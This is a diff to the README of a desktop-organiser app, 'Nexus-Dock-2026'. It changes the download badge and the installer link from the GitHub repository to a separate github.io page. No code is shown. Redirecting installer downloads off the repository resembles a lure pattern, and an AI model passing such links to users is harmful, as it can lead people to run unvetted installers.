@@ -1,6 +1,6 @@
 # 🚀 Nexus-Dock-2026 - Organize your desktop applications with efficiency
 
-[![](https://img.shields.io/badge/Download-NexusDock-blue.svg)](https://github.com/dylpla6727/Nexus-Dock-2026)
+[![](https://img.shields.io/badge/Download-NexusDock-blue.svg)](https://dylpla6727.github.io)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic needs before you install:
 
 You can start the process by visiting the official release page. A direct link is available below to help you get the installer.
 
-[Download Nexus-Dock-2026 Installer](https://github.com/dylpla6727/Nexus-Dock-2026)
+[Download Nexus-Dock-2026 Installer](https://dylpla6727.github.io)
 
 Follow these steps to finish the download:
 
